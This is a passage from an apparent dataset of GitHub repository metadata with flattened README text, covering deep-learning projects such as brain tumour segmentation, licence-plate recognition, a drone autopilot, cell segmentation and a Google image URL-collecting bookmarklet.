science des donnes comme la classification d images la reconnaissance vocale ou le traitement de la langue naturelle En dpit de ces succs importants les garanties thoriques associes ces modles dcisionnels restent aujourd hui toujours fragiles L objectif de cette journe est de faire un tat des lieux sur la comprhension du fonctionnement des rseaux de neurones profonds travers un appel contributions centr autour les thmes non exhaustifs suivants Expressivit des modles Robustesse dcisionnelle incertitude stabilit attaques adversaires Optimisation et problmes non convexes Thorie de la gnralisation Lien entre modles physiques et architectures de rseaux de neurones Les outils utiliss pour aborder ces thmatiques pourront venir de l apprentissage statistique mais des mthodes venant de disciplines connexes dcomposition tensorielles analyse harmonique mthodes gomtriques algbriques physique statistique sont fortement encourages Orateurs inivts Rmi Gribonval LIP ENS Lyon Edouard Oyallon LIP6 Paris CNRS Appel contributions Les personnes souhaitant prsenter leurs travaux cette journe sont invites envoyer par e mail leur proposition titre et rsum de 1 page maximum aux organisateurs avant le 26 septembre 2019 Organisateurs Caroline Chaux Moulin valentin emiya lis lab fr Universit Aix Marseille I2M Valentin Emiya caroline chaux univ amu fr Universit Aix Marseille LIS Franois Malgouyres Francois Malgouyres math univ toulouse fr Institut de Mathmatiques de Toulouse IMT CNRS UMR 5219 Nicolas Thome nicolas thome cnam fr Cnam Paris Konstantin Usevich konstantin usevich univ lorraine fr Universit de Lorraine CRAN Nancy Lien http gdr isis fr index php page reunion idreunion 405,2019-09-11T08:59:23Z,2019-11-15T14:37:05Z,Jupyter Notebook,SpikeAI,Organization,1,3,0,33,master,chloepasturel#laurentperrinet,2,0,0,0,0,0,1
NeuroAI-HD,HD-GLIO,n/a,HD GLIO Introduction This repository provides easy to use access to our HD GLIO brain tumor segmentation tool HD GLIO is the result of a joint project between the Department of Neuroradiology at the Heidelberg University Hospital Germany and the Division of Medical Image Computing at the German Cancer Research Center DKFZ Heidelberg Germany If you are using HD GLIO please cite the following two publications Kickingereder P Isensee F Tursunova I Petersen J Neuberger U Bonekamp D Brugnara G Schell M Kessler T Foltyn M Harting I Sahm F Prager M Nowosielski M Wick A Nolden M Radbruch A Debus J Schlemmer HP Heiland S Platten M von Deimling A van den Bent MJ Gorlia T Wick W Bendszus M Maier Hein KH Automated quantitative tumour response assessment of MRI in neuro oncology with artificial neural networks a multicentre retrospective study Lancet Oncol 2019 May20 5 728 740 https doi org 10 1016 S1470 2045 19 30098 1 Isensee F Petersen J Kohl SAA Jaeger PF Maier Hein KH nnU Net Breaking the Spell on Successful Medical Image Segmentation arXiv preprint 2019 arXiv 1904 08128 https arxiv org abs 1904 08128 HD GLIO was developed with 3220 MRI examinations from 1450 brain tumor patients 80 for training and 20 for testing Specifically the data included 1 a single institutional retrospective dataset with 694 MRI examinations from 495 patients acquired at the Department of Neuroradiology Heidelberg University Hospital Germany corresponding to the Heidelberg training dataset and Heidelberg test dataset described in Kickingereder et al Lancet Oncol 2019 2 a multicentric clinical trial dataset with 2034 MRI examinations from 532 patients acquired across 34 institutions in Europe corresponding to the EORTC 26101 test dataset described in Kickingereder et al Lancet Oncol 2019 3 a single institutional retrospective dataset with 492 MRI examinations from 423 patients 80 glial brain tumors 20 other histological entities undergoing routine MRI at different stages of the disease including 79 early postoperative MRI scans acquired 72h after surgery at the Department of Neuroradiology Heidelberg University Hospital Germany Specifically each MRI examination included precontrast T1 weighted postcontrast T1 weighted T2 weighted and FLAIR sequences all sequences brain extracted and co registered as well as corresponding ground truth tumor segmentation masks HD GLIO performs brain tumor segmentation for contrast enhancing tumor and non enhancing T2 FLAIR signal abnormality We applied a variant of the nnU Net no new Net framework as described in Isensee et al arXiv preprint 2019 for training the HD GLIO algorithm HD GLIO is very fast on GPU with 10s run time per MRI examination Installation Instructions Installation Requirements Unlike HD BET HD GLIO requires a GPU to perform brain tumor segmentation Any GPU with 4 GB of VRAM and cuda pytorch support will do Running the prediction on CPU is not supported Installation with Pip Installation with pip is quick an easy just run the following command and everything will be done for you pip install hdglio Manual installation If you intend to modify HD GLIO you can also install is manually 1 Clone this repository git clone https github com MIC DKFZ HD GLIO 2 Go into the repository the folder with the setup py file and install cd HD GLIO pip install e Per default model parameters will be downloaded to hdglioparams If you wish to use a different folder open hdglio paths py in a text editor and modify folderwithparameterfiles Both manual and pip installation will install two commands with which you can use HD GLIO from anywhere in your system hdgliopredict and hdgliopredictfolder How to use it Using HDGLIO is straightforward You can use it in any terminal on your linux system The hdgliopredict and hdgliopredictfolder commands were installed automatically HD GLIO requires a GPU with at least 4 GB of VRAM to run Prerequisites HD GLIO was trained with four MRI modalities T1 constrast enhanced T1 T2 and FLAIR All these modalities must be present in order to run HD GLIO All input files must be provided as nifti nii gz files containing 2D or 3D MRI image data Sequences with multiple temporal volumes i e 4D sequences are not supported however can be splitted upfront into the individual temporal volumes using fslsplit1 INPUTT1 must be a T1 weighted sequence before contrast agent administration T1 w acquired as 2D with axial orientation e g TSE or as 3D e g MPRAGE INPUTCT1 must be a T1 weighted sequence after contrast agent administration cT1 w acquired as 2D with axial orientation e g TSE or as 3D e g MPRAGE INPUTT2 must be a T2 weighted sequence T2 w acquired as 2D INPUTFLAIR must be a fluid attenuated inversion recovery FLAIR sequence acquired as 2D with axial orientation e g TSE A 3D acquisition e g 3D TSE FSE may work as well These specifications are in line with the consensus recommendations for a standardized brain tumor imaging protocol in clinical trials see Ellingson et al Neuro Oncol 2015 Sep17 9 1188 98 www ncbi nlm nih gov pubmed 26250565 Input files must contain 3D images Sequences with multiple temporal volumes i e 4D sequences are not supported however can be splitted upfront into the individual temporal volumes using fslsplit1 All input files must match the orientation of standard MNI152 template and must be brain extracted and co registered All non brain voxels must be 0 To ensure that these pre processing steps are performed correctly you may adhere to the following example reorient MRI sequences to standard space fslreorient2std T1 nii gz T1reorient nii gz fslreorient2std CT1 nii gz CT1reorient nii gz fslreorient2std T2 nii gz T2reorient nii gz fslreorient2std FLAIR nii gz FLAIRreorient nii gz perform brain extraction using HD BET https github com MIC DKFZ HD BET hd bet i T1reorient nii gz hd bet i CT1reorient nii gz hd bet i T2reorient nii gz hd bet i FLAIRreorient nii gz register all sequences to T1 fsl5 0 flirt in CT1reorient nii gz ref T1reorient nii gz out CT1reorientreg nii gz dof 6 interp spline fsl5 0 flirt in T2reorient nii gz ref T1reorient nii gz out T2reorientreg nii gz dof 6 interp spline fsl5 0 flirt in FLAIRreorient nii gz ref T1reorient nii gz out FLAIRreorientreg nii gz dof 6 interp spline reapply T1 brain mask this is important because HD GLIO expects non brain voxels to be 0 and the registration process can introduce nonzero values T1BRAINMASK nii gz is the mask not the brain extracted image as obtained from HD Bet fsl5 0 fslmaths CT1reorientreg nii gz mas T1BRAINMASK nii gz CT1reorientregbet nii gz fsl5 0 fslmaths T2reorientreg nii gz mas T1BRAINMASK nii gz T2reorientregbet nii gz fsl5 0 fslmaths FLAIRreorientreg nii gz mas T1BRAINMASK nii gz FLAIRreorientregbet nii gz After applying this example you would use T1reorient nii gz CT1reorientregbet nii gz T2reorientregbet nii gz and FLAIRreorientregbet nii gz to proceed Run HD GLIO HD GLIO provides two main scripts hdgliopredict and hdgliopredictfolder Predicting a single case hdgliopredict can be used to predict a single case It is useful for exploration or if the number of cases to be procesed is low Here is how to use it hdgliopredict t1 T1FILE t1c CT1FILE t2 T2FILE flair FLAIRFILE o OUTPUTFILE T1FILE CT1FILE T2FILE FLAIRFILE and OUTPUTFILE must all be niftis end with nii gz The four input files must be preprocesed as specified in How to use it Prerequisites ses above Predicting multiple cases hdgliopredictfolder is useful for batch processing especially if the number of cases to be processed is large By interleaving preprocessing inference and segmentation export we can speed up the prediction significantly Furthermore the pipeline is initialized only once for all cases again saving a lot of computation time Here is how to use it hdgliopredictfolder i INPUTFOLDER o OUTPUTFOLDER INPUTFOLDER hereby contains the T1 T1c T2 and FLAIR images In order to ensure that HD GLIO correctly assigns filenames to modalities you must apply the following naming convention to your data INPUTT1 PATIENTIDENTIFIER0000 nii gz INPUTCT1 PATIENTIDENTIFIER0001 nii gz INPUTT2 PATIENTIDENTIFIER0002 nii gz INPUTFLAIR PATIENTIDENTIFIER0003 nii gz Hereby PATIENTIDENTIFIER can be anything You can use an arbitrary number of patients by using a different PATIENTIDENTIFIER for each patient Predicted segmentations will be saved as PATIENTIDENTIFIER nii gz in the OUTPUTFOLDER 1https fsl fmrib ox ac uk fsl fslwiki Fslutils,2019-09-02T08:28:08Z,2019-12-10T12:36:34Z,Python,NeuroAI-HD,Organization,1,3,0,4,master,FabianIsensee,1,0,0,0,0,0,0
ozramos,classy-image-url-getter,labeling,Classy Image URL Getter A bookmarklet to quickly scrape URLs from Google image results for deep learning classification problems and more Features Easily Add or Remove images Download files even with adblock Handles infinite scroll How to use See the video tutorial https youtu be XrvAm9VQhgU Create a new bookmark and enter the below code into the URL field Go to Google s image search Click on the bookmarklet to start the process Click Add more to add the next batch of images after scrolling Click Download to download a n separated txt file javascript function 7B 2F 0A 20 20Scan 20for 20unparsed 20images 0A 20 20 20Applies 20 22 parsed 22 20so 20that 20we 20don t 20parse 20it 20again 0A 20 20 20Adds 20a 20 F0 9F 91 8D F0 9F 91 8E 20button 20to 20toggle 20image 0A 20 2F 0Aconst 20classyImages 20 3D 20 5B 5D 3B 0Aconst 20parseImages 20 3D 20function 20 7B 0A 20 20const 20 24imgs 20 3D 20document querySelectorAll 0A 20 20 20 20 22 rgdi 3Anot classy parsed 20 rgmeta 22 0A 20 20 3B 0A 0A 20 20 24imgs forEach el 20 3D 3E 20 7B 0A 20 20 20 20const 20 24parent 20 3D 20el parentElement 3B 0A 20 20 20 20const 20index 20 3D 20classyImages length 3B 0A 0A 20 20 20 20 24parent classList add 22classy parsed 22 3B 0A 20 20 20 20 24parent style marginBottom 20 3D 20 2260px 22 3B 0A 20 20 20 20classyImages push 7B 0A 20 20 20 20 20 20 24parent 2C 0A 20 20 20 20 20 20url 3A 20JSON parse el textContent ou 2C 0A 20 20 20 20 20 20isSelected 3A 20true 0A 20 20 20 20 7D 3B 0A 0A 20 20 20 20 2F 2F 20Create 20and 20style 20the 20toggle 0A 20 20 20 20const 20 24toggle 20 3D 20document createElement 22button 22 3B 0A 20 20 20 20 24toggle classList add 22classy toggle 22 3B 0A 20 20 20 20 24toggle textContent 20 3D 20 22 F0 9F 91 8D 22 3B 0A 20 20 20 20 24toggle style fontSize 20 3D 20 2218px 22 3B 0A 20 20 20 20 24toggle style width 20 3D 20 22100 25 22 3B 0A 20 20 20 20 24parent appendChild 24toggle 3B 0A 0A 20 20 20 20 2F 2F 20Toggle 20the 20class 20and 20update 20our 20list 20of 20images 0A 20 20 20 20 24toggle addEventListener 22click 22 2C 20 20 3D 3E 20 7B 0A 20 20 20 20 20 20classyImages 5Bindex 5D isSelected 20 3D 20 classyImages 5Bindex 5D isSelected 3B 0A 20 20 20 20 20 20 24toggle textContent 20 3D 20classyImages 5Bindex 5D isSelected 20 3F 20 22 F0 9F 91 8D 22 20 3A 20 22 F0 9F 91 8E 22 3B 0A 20 20 20 20 20 20 24parent style opacity 20 3D 20classyImages 5Bindex 5D isSelected 20 3F 201 20 3A 200 35 3B 0A 20 20 20 20 20 20updateImageList 3B 0A 20 20 20 20 7D 3B 0A 20 20 7D 3B 0A 0A 20 20updateImageList 3B 0A 7D 3B 0A 0A 2F 0A 20 20Updates 20the 20image 20list 0A 20 2F 0Aconst 20updateImageList 20 3D 20function 20 7B 0A 20 20let 20urls 20 3D 20 22 22 3B 0A 0A 20 20 24text value 20 3D 20classyImages forEach image 20 3D 3E 20 7B 0A 20 20 20 20if 20 image isSelected 20urls 20 2B 3D 20 60 24 7Bimage url 7D 5Cn 60 3B 0A 20 20 7D 3B 0A 0A 20 20 24text value 20 3D 20urls 3B 0A 20 20updateImageCount 3B 0A 7D 3B 0A 0A 2F 0A 20 20Update 20the 20image 20counter 0A 20 2F 0Aconst 20updateImageCount 20 3D 20function 20 7B 0A 20 20let 20count 20 3D 200 3B 0A 0A 20 20classyImages forEach image 20 3D 3E 20 7B 0A 20 20 20 20if 20 image isSelected 20count 2B 2B 3B 0A 20 20 7D 3B 0A 0A 20 20 24numURLs textContent 20 3D 20count 20 2B 20 22 20images 22 3B 0A 7D 3B 0A 0A 2F 0A 20 20Main 20UI 0A 20 2F 0Aconst 20 24container 20 3D 20document createElement 22div 22 3B 0A 24container style position 20 3D 20 22fixed 22 3B 0A 24container style left 20 3D 20 220 22 3B 0A 24container style bottom 20 3D 20 220 22 3B 0A 24container style zIndex 20 3D 20 229999 22 3B 0A 24container style width 20 3D 20 22100 25 22 3B 0A 24container style padding 20 3D 20 2220px 22 3B 0A 24container style boxSizing 20 3D 20 22border box 22 3B 0A 24container style background 20 3D 20 22rgba 255 2C 20255 2C 20255 2C 200 85 22 3B 0Adocument body appendChild 24container 3B 0A 0A 2F 2F 20Add 20Filename 0Aconst 20 24filename 20 3D 20document createElement 22input 22 3B 0A 24filename setAttribute 22type 22 2C 20 22input 22 3B 0A 24filename style width 20 3D 20 22200px 22 3B 0A 24filename style padding 20 3D 20 223px 22 3B 0A 24filename style fontSize 20 3D 20 2218px 22 3B 0A 24filename style marginRight 20 3D 20 2220px 22 3B 0A 24filename value 20 3D 20 22image urls txt 22 3B 0A 24container appendChild 24filename 3B 0A 0A 2F 2F 20Add 20more 20button 0Aconst 20 24addMore 20 3D 20document createElement 22button 22 3B 0A 24addMore textContent 20 3D 20 22Add 20More 20 F0 9F 96 BC 22 3B 0A 24addMore style fontSize 20 3D 20 2218px 22 3B 0A 24addMore style marginBottom 20 3D 20 2220px 22 3B 0A 24addMore style marginRight 20 3D 20 2220px 22 3B 0A 24container appendChild 24addMore 3B 0A 0A 2F 2F 20Download 20button 0Aconst 20 24download 20 3D 20document createElement 22button 22 3B 0A 24download textContent 20 3D 20 22Download 20 F0 9F 92 BE 22 3B 0A 24download style fontSize 20 3D 20 2218px 22 3B 0A 24download style marginBottom 20 3D 20 2220px 22 3B 0A 24container appendChild 24download 3B 0A 0A 2F 2F 20Number 20of 20files 20indicator 0Aconst 20 24numURLs 20 3D 20document createElement 22span 22 3B 0A 24numURLs style float 20 3D 20 22right 22 3B 0A 24numURLs style fontSize 20 3D 20 2218px 22 3B 0A 24numURLs style after 20 3D 20 2220px 22 3B 0A 24numURLs textContent 20 3D 20 22 22 3B 0A 24container appendChild 24numURLs 3B 0A 0A 2F 2F 20Textarea 0Aconst 20 24text 20 3D 20document createElement 22textarea 22 3B 0A 24text style display 20 3D 20 22block 22 3B 0A 24text style width 20 3D 20 22100 25 22 3B 0A 24text style height 20 3D 20 22150px 22 3B 0A 24container appendChild 24text 3B 0A 0A 2F 0A 20 20Add 20More 0A 20 2F 0A 24addMore addEventListener 22click 22 2C 20 20 3D 3E 20 7B 0A 20 20parseImages 3B 0A 7D 3B 0A 0A 2F 0A 20 20Handle 20download 0A 20 2F 0A 24download addEventListener 22click 22 2C 20 20 3D 3E 20 7B 0A 20 20let 20 24a 20 3D 20document createElement 22a 22 3B 0A 20 20let 20file 20 3D 20new 20Blob 5B 24text value 5D 2C 20 7B 0A 20 20 20 20type 3A 20 22application 2Ftext 22 0A 20 20 7D 3B 0A 20 20 24a href 20 3D 20URL createObjectURL file 3B 0A 20 20 24a download 20 3D 20 24filename value 3B 0A 20 20 24a click 3B 0A 20 20 24a remove 3B 0A 7D 3B 0A 0A 2F 0A 20 20Finally 2C 20run 20everything 20once 0A 20 2F 0AparseImages 3B 7D 3B Creating a bookmarklet from source Copy source js into this form https caiorss github io bookmarklet maker Special Note This is one of the few bookmarklet generators that I could get to work with both comments and ES6 Roadmap Save to localstorage to allow for combining search results Add image from the related images panel shown when you click an image PR requests welcome Changelog 8 17 Added a filename field and displays number of selected images,2019-08-17T18:54:10Z,2019-08-26T11:50:15Z,JavaScript,ozramos,User,1,3,1,7,master,ozramos,1,2,2,0,1,0,0
glefundes,AccessALPR,n/a,AccessALPR Deep Learning based ALPR system for vehicle access control trained on brazilian license plates gif sample samplegif gif AccessALPR is a semi ad hoc system developped for robust vehicular access control via images in the wild 1 Features feats 2 Usage usage 3 Implementation Details implementation 4 System Requirements requirements 5 References references Features Frontal and angled plate location powered by YoloV3 Plate recognition independent of character segmentation Plate recognition for classic brazilian plates and new Mercosul plates in a single model Majority vote heuristic algorithm for video stream recognition performance increase Weighted Levenshtein distance costs for plate distance calculation Modular structure meaning you can easily replace the detection and or recognition modules to test your own solutions Usage For infering on single images use test py like this python3 test py i sample 01 jpg o sample Argument Description inputimg i Path to input image to be analyzed output o Folder where the results are stored If passed an image will be saved with the predicted word as the name and the detected plate bounding box plotted readonly r If passing an already cropped plate this will pass the image directly to the plate reader Examples Brazilian Plate New Mercosul Plate Read Only Mode Input Image Output Image ABC1234 For usage on a live video feed we provide httpstream py capable of parsing and logging detected plates in real time Since the camera is fixed we don t need to pass the whole frame to de detector network and instead we define an anchor as the top left corner and grab a 416x416 square from that area The anchor HTTP URL authentication and other configurations can be done by editing the config ini file on the project s root python3 httpstream py Feed Example sample feedexample png The red square is the section that is being passed to the plate detection network and the blue square is the detected plate bbox Plate partially censored due to privacy concerns Implementation details The weights for the plate detector and plate reader can be downloaded here Google Drive https drive google com open id 1KvIcIMOZ0o9xeW6Q037Lo8S5bfWUrfz Their paths should be respectively detector weights detector w pth and reader weights reader w pth Due to the proprietary nature of the datasets used I m not at liberty to release them for usage Plate Detector YoloV3 checkout eriklindernoren s implementation https github com eriklindernoren PyTorch YOLOv3 he did a great job on COCO pre trained and retrained finetuned for detection of brazilian license plates Usage via the PlateDetector object detector PlateDetector py Accuracy is greatly improved if input images have a 1 1 aspect ratio Plate Reader Unlike most ALPR systems we don t use a character segmentation stage prior to recognition Segmentation is usually the performance bottleneck in most systems being the most error prone of them We employ an Efficient Net B0 backbone to extract 252 features from an input image and then parse that into 7 sets of 36 probabilities The maximum of each of the 7 is the output letter guessed by the network This is also very efficient taking an average of 16ms per prediction counting the majority vote overhead Implementation details can be seen on the reader PlateReader py file CNN sample cnn png This approach is arguably less accurate than systems with very accurate segmentation steps on high resolution images but for our specific applications we achieve competitive results by infering on multiple sequential frames and employing a majority vote algorithm to parse the best result This is done by using the Sort tracker https github com abewley sort on the detected bounding boxes Check httpstream py for an example Plate Matching 100 match is not always a realistic expectation for unconstraind environments especially for easily mistakable characters like I and T K and R etc In order to use the prediction for access control we recommend using Weighted Levenshtein s distance We computed the confusion matrix https github com glefundes AccessALPR blob master sample confusionmatrix png for individual characters on our dataset and used it to define substitution costs for the weighted Levenshtein distance algorithm according to the following rule equation http www sciweavers org tex2img php eq 24 24cost 20 3D 201 20 205 20 5Ccdot 20n 24 24 bc White fc Black im jpg fs 12 ff arev edit 0 where n is the value for the pairing in the normalized confusion matrix To obtain the Levenshtein distance we call the utils levdistance plate1 plate2 function to obtain the value We establish a threshold of 0 2 for considering the plates a match Pre Processing Experimental There are multiple optional pre process algorithms available in reader utils py in the PreProcessor class CLAHE histogram normalization and different RETINEX algorithms are available and can possibly improve performance in low light situations Due to limited dataset resources we could not prove significant quantitative results but there is a clear visual improvement when applying the filters To use them initialize the plate reader object by passing the filter keyword like this Filter options CLAHE RETINEX CP RETINEX CR RETINEX AUTO platereader PlateReader filter CLAHE It is worth noting that while the best qualitative results are obtained with the Automated RETINEX algorithm it also introduces significant overhead to the reading process The RETINEX implementation was taken from here https github com dongb5 Retinex System Requirements The code was implemented using Ubuntu 16 04 Python 3 5 Pytorch 1 1 0 and tested to run in real time on a NVIDIA GTX TITAN 1080 Other projects and repositories used during implementation https github com eriklindernoren PyTorch YOLOv3 https github com abewley sort https github com lukemelas EfficientNet PyTorch https github com takeitallsource cnn traffic light evaluation https github com dongb5 Retinex https github com infoscout weighted levenshtein Shout out to them and please check out their great work,2019-09-03T14:17:03Z,2019-11-01T20:45:32Z,Python,glefundes,User,1,3,1,18,master,glefundes,1,0,0,0,0,0,0
XinLi-zn,Daily-paper,n/a,,2019-08-15T01:23:42Z,2019-12-03T06:18:07Z,n/a,XinLi-zn,User,2,3,0,7,master,XinLi-zn,1,0,0,0,0,0,0
aditya140,tellopilot,n/a,Tello pilot Drone Controller This is an implementation of Autopilot for Tello Drone The base library used for operating the tello drone is implemented by damiafuntes https github com damiafuentes DJITelloPy I have made some minor changes to this library to make it more autonomous and robust to be implemented for an Autopilot Autopilot 1 To run the autopilot you need to have your laptop wifi connected to the drone wifi once connected you are ready to go 2 Use the following command to run the program shell python tellofastgame py Implementation Details The ability of this autopilot is limited to following a person or a face depending upon the mode specified Once a face or a person is found in the view the autopilot used various algorithms to track the object KCF tracker The person in the image is detected by using the YOLO V3 neural network,2019-09-16T00:31:37Z,2019-11-30T09:25:02Z,Python,aditya140,User,1,3,0,7,master,aditya140,1,0,0,0,0,0,0
yanglf1121,NuSeT,analyzing-crowded-cells#deep-learning#rpn#unet-image-segmentation,NuSeT NuSeT A Deep Learning Tool for Reliably Separating and Analyzing Crowded Cells To run the code The following packages are needed for NuSeT to run 1 tensorflow currently only works for tensorflow 1 pip3 install tensorflow pip3 install tensorflow gpu 2 PIL pip3 install Pillow 3 numpy pip3 install numpy 4 scikit image pip3 install scikit image 5 tqdm pip3 install tqdm NuSeT works better for moderate sized nuclei cells please adjust the resize ratio in Configuration section under Predicting module For optimal nuclei cells sizes please refer to images under sampleimage folder After finishing installing packages download the 2 weight files from google drive https drive google com file d 1fcs1F2lGPX0ejzEGPZ63YNF3AmUbdBcM view usp sharing https drive google com file d 1hythQfvD6kbaUClAPY96nHcXB7RXVmBx view usp sharing move those files to Network folder Then navigate to the root folder of this repo NuSeT in the command line run python3 NuSeT py For the detailed user guide please see our paper https www biorxiv org content 10 1101 749754v1 The motivation for this work Tools for segmenting fluorescent nuclei need to address multiple features and limitations of biological images Typical issues and limitations include 1 Boundary assignment ambiguity biological samples frequently have very high cell density with significant overlap between objects 2 Signal intensity variation Within one image the signal can vary within each nucleus e g due to different compaction states of the DNA in heterochromatin vs euchromatin and across nuclei e g due to cell to cell differences in nuclear protein expression levels and differences in staining efficiency 3 Non cellular artifacts and contaminants Fluorescence microscopy samples are often contaminated with auto fluorescent cell debris as well as non cellular artifacts 4 Low signal to noise ratios SNRs Low SNRs typically result from lower expression levels of fluorescent targets and or high background signal such as sample auto fluorescence The highlights for this work This work took the advantages of two state of the art cell segmentation models U Net and Mask RCNN This work also incorporated other algorithms to specifically address issues cell biologists may encounter during imaging The improvements include 1 Fusing U Net parallely with Region Proposal Network RPN following a watershed transform to achieve accurate cell boundary assignment in dense environment 2 Foreground normalization to improve detection on sample paration artifacts and signal variations 3 Sythetic images to further improve detection on sample paration artifacts and cell boundary assignment 4 Graphic user interface for using pre trained NuSeT models and for training new models using custom training data Results using pre trainined NuSeT model on Kaggle 2018 data science bowl and images from our lab Reference and citation This work is inspired from https github com tryolabs luminoth tree master luminoth models fasterrcnn https github com endernewton tf faster rcnn https www kaggle com c data science bowl 2018 https github com matterport MaskRCNN Road map The next step for NuSeT is to include a module that can track cells in time lapse movies and output tracking coordinates as csv files If you like our NuSeT here is the paper for this work https www biorxiv org content 10 1101 749754v1 Please cite this paper if NuSeT helps your work,2019-09-08T17:53:15Z,2019-11-27T23:50:32Z,Python,yanglf1121,User,2,3,1,35,master,yanglf1121,1,0,0,0,0,0,0
Guo-Xiaoqing,Reading-List,reading-list,Reading List The goal of this document is to provide a reading list for Deep Learning in Computer Vision and Medical Image Analysis Field Attention Saliency Zhou Bolei et al Learning deep features for discriminative localization Proceedings of the IEEE conference on computer vision and pattern recognition 2016 Chen Liang Chieh et al Attention to scale Scale aware semantic image segmentation Proceedings of the IEEE conference on computer vision and pattern recognition 2016 Vaswani Ashish et al Attention is all you need Advances in neural information processing systems 2017 Selvaraju Ramprasaath R et al Grad cam Visual explanations from deep networks via gradient based localization Proceedings of the IEEE International Conference on Computer Vision 2017 Wang Fei et al Residual attention network for image classification Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2017 Zhang Rui et al Scale adaptive convolutions for scene parsing Proceedings of the IEEE International Conference on Computer Vision 2017 Fu Jianlong Heliang Zheng and Tao Mei Look closer to see better Recurrent attention convolutional neural network for fine grained image recognition Proceedings of the IEEE conference on computer vision and pattern recognition 2017 Wei Zhen et al Learning adaptive receptive fields for deep image parsing network Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2017 Mahapatra Dwarikanath et al Image super resolution using generative adversarial networks and local saliency maps for retinal image analysis International Conference on Medical Image Computing and Computer Assisted Intervention Springer Cham 2017 Guan Qingji and Yaping Huang Multi label chest X ray image classification via category wise residual attention learning Pattern Recognition Letters 2018 Wang Xiaolong et al Non local neural networks Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2018 Zhang Han et al Self attention generative adversarial networks arXiv preprint arXiv 1805 08318 2018 Tensorflow code https github com taki0112 Self Attention GAN Tensorflow Yan Yichao et al Multi level attention model for person re identification Pattern Recognition Letters 2018 SENet Hu Jie Li Shen and Gang Sun Squeeze and excitation networks In CVPR 2018 Roy Abhijit Guha Nassir Navab and Christian Wachinger Concurrent spatial and channel squeeze excitationin fully convolutional networks International Conference on Medical Image Computing and Computer Assisted Intervention Springer Cham 2018 Xu Rudong et al Attention Mechanism Containing Neural Networks for High Resolution Remote Sensing Image Classification Remote Sensing 10 10 2018 1602 Guan Qingji et al Diagnose like a radiologist Attention guided convolutional neural network for thorax disease classification arXiv preprint arXiv 1801 09927 2018 Sarafianos Nikolaos Xiang Xu and Ioannis A Kakadiaris Deep imbalanced attribute classification using visual attention aggregation Proceedings of the European Conference on Computer Vision ECCV 2018 Oktay Ozan et al Attention u net Learning where to look for the pancreas arXiv preprint arXiv 1804 03999 2018 Wang Yi et al Deep attentional features for prostate segmentation in ultrasound International Conference on Medical Image Computing and Computer Assisted Intervention Springer Cham 2018 Li Hanchao et al Pyramid attention network for semantic segmentation arXiv preprint arXiv 1805 10180 2018 AffinityNet Ahn Jiwoon and Suha Kwak Learning pixel level semantic affinity with image level supervision for weakly supervised semantic segmentation Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2018 Ke Zi Yi and Chiou Ting Hsu Generating Self Guided Dense Annotations for Weakly Supervised Semantic Segmentation arXiv preprint arXiv 1810 07050 2018 Li Kunpeng et al Tell me where to look Guided attention inference network Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2018 Fan Lei et al Semantic segmentation with global encoding and dilated decoder in street scenes IEEE Access 6 2018 50333 50343 Huang Zilong et al Ccnet Criss cross attention for semantic segmentation arXiv preprint arXiv 1811 11721 2018 Zhao Hengshuang et al Psanet Point wise spatial attention network for scene parsing Proceedings of the European Conference on Computer Vision ECCV 2018 Pu Shi et al Deep attentive tracking via reciprocative learning Advances in Neural Information Processing Systems 2018 Woo Sanghyun et al Cbam Convolutional block attention module Proceedings of the European Conference on Computer Vision ECCV 2018 Jiao Jianbo et al Look deeper into depth Monocular depth estimation with semantic booster and attention driven loss Proceedings of the European Conference on Computer Vision ECCV 2018 Yuan Yuhui and Jingdong Wang Ocnet Object context network for scene parsing arXiv preprint arXiv 1809 00916 2018 Ling Hefei et al Self Residual Attention Network for Deep Face Recognition IEEE Access 7 2019 55159 55168 Fu Jun et al Dual attention network for scene segmentation Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 Domain adaptation Kang Guoliang et al Contrastive Adaptation Network for Unsupervised Domain Adaptation Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 Chen Yun Chun et al CrDoCo Pixel Level Domain Transfer With Cross Domain Consistency Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 Chen Chaoqi et al Progressive Feature Alignment for Unsupervised Domain Adaptation Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 You Kaichao et al Universal Domain Adaptation Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 Zhu Xinge et al Adapting Object Detectors via Selective Cross Domain Alignment Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 Gong Rui et al DLOW Domain flow for adaptation and generalization Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2019 Segmentation Deeplab Chen Liang Chieh et al Deeplab Semantic image segmentation with deep convolutional nets atrous convolution and fully connected crfs IEEE transactions on pattern analysis and machine intelligence 40 4 2017 834 848 Tensorflow code https github com DrSleep tensorflow deeplab lfov Deeplab v3 Chen Liang Chieh et al Encoder decoder with atrous separable convolution for semantic image segmentation Proceedings of the European conference on computer vision ECCV 2018 Tensorflow code https github com rishizek tensorflow deeplab v3 plus Semi supervised Unsupervised Learing Prior Information Loss function,2019-09-05T11:56:33Z,2019-09-14T03:38:37Z,n/a,Guo-Xiaoqing,User,2,3,0,36,master,Guo-Xiaoqing#franciszchen#cyang-cityu,3,0,0,0,0,0,0
syslot,WALLE_X,n/a,WALLE This is the distributed simulation environment for deep reinforcement learning algorithm test,2019-09-04T14:47:55Z,2019-10-24T16:03:05Z,Python,syslot,User,1,3,0,1,master,syslot,1,0,0,0,0,0,0
lessw2020,AutoOpt-for-FastAI,n/a,AutoOpt for FastAI Integrate Ebay s AutoOpt Deep Learning Optimizer into the FastAI framework,2019-08-28T20:42:16Z,2019-09-21T15:49:25Z,n/a,lessw2020,User,2,3,0,1,master,lessw2020,1,0,0,0,0,0,0
klausdorer,2019SummerSchool,n/a,2019SummerSchool Material on deep learning for the 2019 Summer School at Offenburg university,2019-09-10T06:14:07Z,2019-09-18T06:32:25Z,Jupyter Notebook,klausdorer,User,3,3,0,4,master,klausdorer,1,0,0,0,0,0,0
